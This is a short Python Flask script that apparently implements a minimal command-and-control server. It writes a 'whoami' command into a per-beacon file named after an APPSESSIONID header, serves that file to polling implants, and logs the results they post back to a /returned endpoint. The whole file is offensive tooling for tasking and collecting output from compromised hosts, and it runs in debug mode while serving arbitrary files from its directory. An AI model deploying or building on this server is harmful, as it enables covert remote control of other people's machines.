from flask import *
from string import ascii_letters, digits

app = Flask(__name__)

@app.route("/")
def home():
    # Grab the appsessionid value from the headers
    val = request.headers['APPSESSIONID']
    if set(val).difference(ascii_letters + digits):
        # We're not going to bother with input sanatization here
        # If we recieve special characters just drop it entirely
        pass
    else:
        print(f'headers:{val}')
        # create a new page for the UUID we got from the headers
        f = open(f"/var/www/html/{val}.html", "a")
        f.write("cmd;whoami;null ")
        f.close()
        return('found')

@app.route('/<path:filename>', methods=['GET', 'POST'])
def index(filename):
    if request.method == 'GET':
        val = {request.headers['APPSESSIONID']}
        print(f'Host {val} grabbed command')
        return send_from_directory('.', filename)

    return jsonify(request.data)

@app.route("/returned",methods = ['POST'])
def results():
    if request.method == 'POST':
        val = {request.headers['APPSESSIONID']}
        print(f'Result: {request.data} from beacon: {val}')
        return 'HELO'

if __name__=="__main__":
   app.run(debug=True)
